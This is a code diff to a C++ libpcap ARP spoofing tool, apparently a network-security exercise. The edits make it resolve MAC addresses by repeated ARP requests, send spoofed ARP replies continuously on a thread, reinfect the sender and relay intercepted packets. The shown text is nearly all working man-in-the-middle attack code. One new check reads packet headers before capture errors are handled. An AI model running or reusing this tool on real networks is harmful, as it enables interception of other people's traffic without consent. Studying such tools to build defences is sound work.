@@ -3,23 +3,24 @@
 Mac getMac(pcap_t *handle, Ip attackerIp, Mac attackerMac, Ip ip)
 {
 	EthArpPacket pkt = EthArpPacket(ArpHdr::Request, Mac::broadcastMac(), attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, attackerMac, attackerIp, Mac::nullMac(), ip);
-
-	sendArp(handle, pkt);
+	
+	// In case the screen is off
+	std::thread arpThreadForGetMac(continueSendArp, handle, pkt, 3);
 
 	while (true)
 	{
 		struct pcap_pkthdr *header;
 		const u_char *reply_packet;
 		int result = pcap_next_ex(handle, &header, &reply_packet);
-		if (result != 1)
-		{
+		if (result != 1 || header->caplen > 1500 || header->len > 1500)
+		{               // ignore jumbo packet
 			continue;
 		}
 		EthArpPacket *reply = (EthArpPacket *)reply_packet;
-
 		if (ntohs(reply->eth_.type_) == EthHdr::Arp && ntohs(reply->arp_.op_) == ArpHdr::Reply &&
 			reply->arp_.sip_ == Ip(htonl(ip)) && reply->arp_.tip_ == Ip(htonl(attackerIp)))
 		{
+			arpThreadForGetMac.detach();
 			return reply->arp_.smac_;
 		}
 	}
@@ -126,14 +127,13 @@ bool isInfectedPkt(pcap_t *handle, const u_char *receivedPkt, Flow flow)
 
 void spoofProcess(int mode, pcap_t *handle, EthArpPacket pkt, Flow flow)
 {
-	printf("execute\n");
 	struct pcap_pkthdr *header;
 	const u_char *receivedPkt;
 	std::thread sendArpThread(continueSendArp, handle, pkt, 10);
 	while (true)
 	{
 		int result = pcap_next_ex(handle, &header, &receivedPkt);
-		if (result == 0)
+		if (result == 0 || header->caplen > 1500 || header->len > 1500) // ignore jumbo packet
 			continue;
 		if (result == PCAP_ERROR || result == PCAP_ERROR_BREAK)
 		{
@@ -146,7 +146,7 @@ void spoofProcess(int mode, pcap_t *handle, EthArpPacket pkt, Flow flow)
 			printf("[*] Reinfect sender..\n");
 			sendArp(handle, pkt);
 		}
-		else if (isInfectedPkt(handle, receivedPkt, flow))
+		if (isInfectedPkt(handle, receivedPkt, flow))
 		{
 			relayPacket(handle, header, receivedPkt, flow);
 		}
